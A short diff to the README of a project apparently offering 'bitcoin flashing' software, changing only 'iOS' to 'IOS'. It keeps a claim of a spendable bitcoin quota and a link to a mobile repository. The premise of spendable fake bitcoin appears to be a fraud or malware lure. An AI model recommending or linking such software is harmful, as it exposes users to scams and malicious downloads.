@@ -13,7 +13,7 @@ When you gain app access, you'll have a limited spendable quota of either bitcoi
 ## Prerequisites
 This application requires [Node.js](https://nodejs.org) to run.
 
-### Android/iOS
+### Android/IOS
 
 Click [here](https://github.com/bitcoin-flashing-software/mobile-release) to visit the mobile repository.
 
